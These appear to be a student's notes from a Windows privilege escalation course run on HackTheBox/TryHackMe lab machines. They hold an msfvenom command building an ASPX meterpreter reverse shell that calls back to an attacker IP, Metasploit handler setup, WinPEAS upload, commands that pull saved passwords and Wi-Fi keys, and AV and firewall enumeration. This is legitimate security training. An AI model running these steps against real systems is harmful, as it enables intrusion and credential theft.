
## Introduction

### Course Introduction

> [!note] 
> Resources for this video:
TCM Security Website - https://tcm-sec.com/
The Cyber Mentor Website - https://www.thecybermentor.com/
The Cyber Mentor Twitter - https://twitter.com/thecybermentor
The Cyber Mentor Twitch - https://twitch.tv/thecybermentor
My LinkedIn: - https://linkedin.com/in/heathadams

![[Pasted image 20230409140356.png]]

![[Pasted image 20230409140441.png]]

![[Pasted image 20230409140543.png]]

![[Pasted image 20230409140801.png]]


### Course Discord (Important)

> [!note] 
> Resources for this video:
> Course Discord - [https://discord.gg/tcm](https://discord.gg/tcm) 


### Resources and Tips for Success

> [!note] 
> Resources for this video:
Fuzzy Security Guide - https://www.fuzzysecurity.com/tutorials/16.html
PayloadsAllTheThings Guide - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
Absolomb Windows Privilege Escalation Guide - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
Sushant 747's Guide (Country dependant - may need VPN) - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html


### Course Repo

> [!note] 
>  Welcome to the course. I truly hope you enjoy it and learn from it!
>  
>  Please see the attached link for a list of all resources used in the course. A very special thanks goes to Grimmie for putting this together! <3
>  
>  [https://github.com/Gr1mmie/Windows-Priviledge-Escalation-Resources](https://github.com/Gr1mmie/Windows-Priviledge-Escalation-Resources)
>  
>  Thank you!
>  
>  Heath


## Gaining a Foothold

### Introduction

> [!info] 
> To avoid Windows Licence cost's, this course is mostly based on HackTheBox / TryHackMe
> 

![[Pasted image 20230409142334.png]]

### Gaining a Foothold (Box 1)

Open HTTP and FTP Service:

FTP Server allow `anonymous` and as password `*anything*` Login.

> [!todo] 
> Create meterpreter web reverse shell
> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.87 LPORT=9001 -f aspx > shell.aspx`
> 

> [!todo] 
> run `msfconsole`
> `use exploit/multi/handler` 
> `show options`
> `set lhost tun0`
> `set lport 9001`
> `set payload windows/meterpreter/reverse_tcp`
> `run`

> [!todo] 
>  Open URL with `shell.aspx` on server.
>  Now we got `meterpreter` shell!
>  `getuid`
>  `sysinfo`

![[Pasted image 20230420150019.png]]

## Initial Enumeration

> [!todo] 
> In `meterpreter` shell:
> `shell`
> `systeminfo`
> `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
> `hostname`

![[Pasted image 20230420153212.png]]

> [!todo] 
> See when patches where installed:
> `wmic qfe` 
> `wmic qfe get Caption,Description,HotFixID,InstalledOn`

![[Pasted image 20230420153611.png]]

> [!todo] 
> Show connected volumes:
>  `wmic logicaldisk`
>  `wmic logicaldisk get caption,description,providername`
>  `wmic logicaldisk get caption`

![[Pasted image 20230420154022.png]]

![[Pasted image 20230420154133.png]]


### User Enumeration

> [!todo] 
> `whomai`
>  `whoami /priv`
>  `whoami /groups`

![[Pasted image 20230420155409.png]]

> [!todo] 
> `net user` 
> `net user <username>`
> `net localgroup`

![[Pasted image 20230420160933.png]]

> [!todo] 
>  `net localgroup administrators`

![[Pasted image 20230420161129.png]]


### Network Enumeration

> [!todo] 
>  `ipconfig /all` -> Under DNS, maybe we can see Domain Controller IP
>  `arp -a`

![[Pasted image 20230420164424.png]]

> [!todo] 
>  `route print`

![[Pasted image 20230420164812.png]]

> [!todo] 
>  `netstat -ano`

![[Pasted image 20230420165012.png]]


### Password Hunting

> [!note] 
> More Infos and Tips:
>  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#search-for-file-contents

> [!todo] 
>`findstr /si password *.txt` > Search in current and subdirectory
>`findstr /si password *.txt *.ini *.config`

> [!todo] 
> Wlan Password 
> `netsh wlan show profile`
> `netsh wlan show profile <SSID> key=clear`


### AV Enumeration

> [!todo] 
> Windows Defender:
> `sc query windefend` 

![[Pasted image 20230420171557.png]]

> [!todo] 
> Find other running Antivirus Software:
> Query running services:
> `sc queryex type= service` 

> [!todo] 
> Check Firewall Configuration:
>  `netsh advfirewall firewall dump`
>  If this is not returning anything, use:
>  `netsh firewall show state`

![[Pasted image 20230420172255.png]]

> [!todo] 
> `netsh firewall show config` 

![[Pasted image 20230420172448.png]]

## Exploring Automated Tools

### Automated Tool Overview

> [!note] 
>  Resources for this video:
>  - WinPEAS - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
>  - Windows PrivEsc Checklist - https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
>  - Sherlock - https://github.com/rasta-mouse/Sherlock
>  - Watson - https://github.com/rasta-mouse/Watson
>  - PowerUp - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
>  - JAWS - https://github.com/411Hall/JAWS
>  - Windows Exploit Suggester - https://github.com/AonCyberLabs/Windows-Exploit-Suggester
>  - Metasploit Local Exploit Suggester - https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/
>  - Seatbelt - https://github.com/GhostPack/Seatbelt
>  - SharpUp - https://github.com/GhostPack/SharpUp

![[Pasted image 20230420172800.png]]

> [!hint] 
> Nice Hack Tips:
> https://book.hacktricks.xyz


### Exploring Automated Tools

> [!todo] 
>meterpreter:
>` cd c:\\Windows\\Temp\\`
 >`upload /home/kali/Downloads/winPEAS.exe` 
> `shell`
> 

Sometimes there will be a issue that shell isn't working well, see example below:

![[Pasted image 20230422151951.png]]

> [!todo] 
>  we can try with meterpreter:
>  `load powershell`
>  But isn't working too on this box

> [!todo] 
> Use meterpreter to find possible exploits:
> `run post/multi/recon/local_exploit_suggester ` 

![[Pasted image 20230422152509.png]]

> [!todo] 
> run  `systeminfo` on Windows Target.
> Save result to systeminfo.txt

> [!todo] 
> `curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py; python get-pip.py  `
> `pip install xlrd==1.2.0 --upgrade` or with sudo
>  `python2 windows-exploit-suggester.py --update`
>  `python2 windows-exploit-suggester.py --database 2023-04-22-mssb.xls --systeminfo systeminfo.txt`

![[Pasted image 20230422160140.png]]


## Escalation Path: Kernel Exploits

### Kernel Exploits Overview

> [!note] 
> Resources for this video:
> Windows Kernel Exploits - [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits) 

